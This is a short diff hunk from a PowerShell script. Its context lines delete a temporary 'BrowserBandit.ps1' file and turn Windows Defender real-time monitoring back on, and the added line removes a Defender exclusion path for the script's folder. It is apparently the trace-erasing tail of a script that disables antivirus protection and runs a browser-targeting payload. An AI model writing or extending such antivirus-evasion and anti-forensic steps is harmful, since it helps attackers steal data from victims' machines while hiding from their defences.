@@ -28,4 +28,5 @@ Remove-Item "$env:temp\BrowserBandit.ps1"
 
 # Re-enable real-time monitoring and exit
 Set-MpPreference -DisableRealtimeMonitoring 0
+Set-MpPreference -ExclusionPath $dir -Remove
 exit
